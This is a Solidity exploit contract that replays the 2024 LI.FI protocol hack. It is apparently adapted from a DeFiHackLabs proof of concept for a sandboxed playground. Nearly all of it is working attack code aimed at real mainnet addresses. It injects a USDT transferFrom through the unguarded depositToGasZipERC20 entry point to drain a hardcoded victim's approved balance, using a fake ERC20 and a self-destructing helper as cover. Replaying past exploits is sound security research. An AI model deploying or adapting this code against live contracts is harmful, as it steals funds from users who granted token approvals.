// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-Lifiprotocol).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this); ContractTest.attack() builds the malicious
// LibSwap.SwapData and calls the LiFiDiamond directly), so there is no
// standalone "…Exploit" contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (ContractTest.attack() + the
// Money and Help helper contracts) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/Lifiprotocol_exp.sol.
//
// Root cause: LI.FI's GasZipFacet.depositToGasZipERC20() is a public,
// unguarded "protocol step" that forwards a fully attacker-controlled
// LibSwap.SwapData straight into LibSwap.swap() -- WITHOUT the allow-list
// check (LibAllowList.contractIsAllowed/selectorIsAllowed) that every other
// swap entry point enforces. LibSwap.swap()'s only guard on `callTo` is
// "has bytecode" (isContract). The attacker sets callTo = USDT and
// callData = transferFrom(victim, attacker, victim's whole balance); because
// the LiFiDiamond is delegatecalled into (so msg.sender of the low-level
// call is the Diamond itself) and the victim gave the Diamond an infinite
// USDT approval, USDT executes the transfer and the victim's balance is
// stolen in one call. A throwaway `Money` "ERC20" (balanceOf=1, allowance=0,
// approve=true) is used as sendingAssetId/receivingAssetId so LibSwap.swap's
// own pre-call accounting (fromAmount=1, balance>=1) is satisfied while the
// real value moves via the injected USDT.transferFrom. Money.approve() also
// deploys a tiny `Help` self-destructing contract that forwards 1 wei to the
// Diamond -- a harmless no-op "cover" step copied verbatim from the test
// (LibAsset.maxApproveERC20 calls approve() twice since allowance(0) < 1).

interface IUSDTLike {
    function balanceOf(address who) external view returns (uint256);
}

struct SwapData {
    address callTo;
    address approveTo;
    address sendingAssetId;
    address receivingAssetId;
    uint256 fromAmount;
    bytes callData;
    bool requiresDeposit;
}

interface LiFiDiamond {
    function depositToGasZipERC20(
        SwapData calldata _swapData,
        uint256 _destinationChains,
        address _recipient
    ) external;
}

contract LifiprotocolDrain {
    IUSDTLike constant USDT = IUSDTLike(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    LiFiDiamond constant Vulncontract = LiFiDiamond(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE);
    address constant Victim = 0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;

    Money public money;

    // Copied from ContractTest.attack() (test/Lifiprotocol_exp.sol), with two
    // adjustments for the standalone-contract shape (the original attack is
    // inline in the Foundry test, where `attacker == address(this)`; here
    // `run()` executes inside a SEPARATE deployed contract, so every
    // `address(this)` in the original that meant "the attacker" is replaced
    // with `msg.sender` -- the attacker EOA that calls `run()`):
    //   1. the injected `transferFrom(victim, <recipient>, amount)` recipient
    //   2. `depositToGasZipERC20`'s `_recipient` (where the gas.zip router
    //      deposit -- unrelated cover step -- would land)
    // `Money` is additionally funded with a few wei so its `approve()`
    // cover-step (`help.sendto{value: 1}(Diamond)`, called once per
    // `maxApproveERC20` retry -- twice total, per the on-chain trace) has
    // balance to forward. The historical fork dump captured `Money`'s
    // address holding leftover wei from the live attack tx's msg.value
    // routing; a freshly-deployed synthetic `Money` starts at 0 balance, so
    // this replay funds it explicitly from the attacker's own balance
    // (`setup.fundAttackerWei` in the config) instead. Neither change alters
    // the exploit mechanism -- the injected call's target/calldata (the
    // actual vulnerability) is identical to the original test.
    function run() external {
        address recipient = msg.sender;
        money = new Money{value: 4}();
        SwapData memory swapData = SwapData({
            callTo: address(USDT),
            approveTo: address(this),
            sendingAssetId: address(money),
            receivingAssetId: address(money),
            fromAmount: 1,
            callData: abi.encodeWithSelector(bytes4(0x23b872dd), address(Victim), recipient, 2_276_295_880_553),
            requiresDeposit: true
        });

        Vulncontract.depositToGasZipERC20(swapData, 0, recipient);
    }

    // The Diamond's fallback delegatecalls the facet, so LibSwap.swap's
    // final `.call{value: nativeValue}(_swap.callData)` also needs somewhere
    // to send a `receive`/`fallback` if it ever forwarded value here -- kept
    // for parity with the original ContractTest's `fallback() external payable {}`.
    fallback() external payable {}

    receive() external payable {}
}

// Fake ERC20 used as the swap's sendingAssetId/receivingAssetId. Copied
// verbatim from the test's `Money` contract: balanceOf always returns 1,
// allowance always returns 0 (forcing LibAsset.maxApproveERC20 to call
// approve() twice), and approve() is a no-op that also deploys `Help` to
// forward 1 wei to the Diamond -- exactly mirroring the original attack's
// bookkeeping-satisfying cover steps.
contract Money {
    address constant Vulncontract = 0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE;
    address owner;
    Help public help;

    constructor() payable {
        owner = msg.sender;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0;
    }

    function approve(address, uint256) external returns (bool) {
        help = new Help();
        help.sendto{value: 1}(Vulncontract);
        return true;
    }

    fallback() external payable {}

    receive() external payable {}
}

// Tiny ether-forwarder + self-destruct, copied verbatim from the test's
// `Help` contract.
contract Help {
    address constant Vulncontract = 0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE;
    address owner;

    constructor() payable {
        owner = msg.sender;
    }

    function sendto(address who) external payable {
        (bool success, ) = who.call{value: msg.value}("");
        require(success, "Error");
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {}

    receive() external payable {}
}
